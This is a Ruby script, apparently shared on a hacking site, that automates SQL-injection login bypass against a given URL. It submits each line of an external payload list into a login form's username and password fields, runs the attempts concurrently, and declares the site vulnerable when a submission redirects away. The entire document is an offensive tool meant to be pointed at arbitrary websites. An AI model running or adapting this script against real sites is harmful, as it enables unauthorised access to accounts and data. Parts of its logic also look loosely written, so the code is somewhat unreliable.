#!/bin/ruby
##################################################
#        Automated SQL Login Bypass Tool         #
#        By: Luis "connection" Santana           #
#               HackTalk Security                #
#              http://hacktalk.net               #
##################################################

require "mechanize"
require "work_queue"

unless ARGV.length == 1
	puts "Proper usage"
	puts "Usage: ruby sqlogin.rb url"
	puts "Where url is the url to the login form"
	puts "Example: ruby sqllogin.rb www.site.com/login.php"
	exit
end

success = 0
site = ARGV[0]

agent = Mechanize.new
agent.user_agent_alias = "Windows Mozilla"
page = agent.get("http://#{site}")

puts "Bruteforce started"
puts
login_form = page.forms[0]
wq = WorkQueue.new(25,10)
File.open("bypassList.txt").each_line.each do |bypass|
	wq.enqueue_b {
		login_form.field[0] = bypass
		login_form.field[1] = bypass
		page = agent.submit(login_form, login_form.buttons.first)

		if page.response.status =~ /(30.|200)/
			if page.uri =~ /#{site}/
			else
				puts "[+] Bypass Successful With #{bypass}"
				success = 1
			end
		end
	}
	wq.join
end

if success == 1
	puts "[+] #{site} Vulnerable To SQL Login Bypass"
else
	puts "[!] SQL Login Bypass Failed"
end
